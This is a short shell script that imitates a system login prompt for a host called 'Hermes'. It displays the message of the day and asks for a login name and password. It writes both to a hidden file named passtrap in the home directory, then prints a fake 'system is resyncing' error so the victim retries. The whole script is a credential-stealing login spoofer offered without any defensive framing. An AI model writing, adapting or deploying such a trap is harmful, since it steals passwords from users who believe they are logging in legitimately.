cat /etc/motd
echo welcome to Hermes
echo login:
read number
echo
echo $number > ~/passtrap
echo passwd:
read number
echo
echo $number >> ~/passtrap
echo
echo The system is resyncing try again later.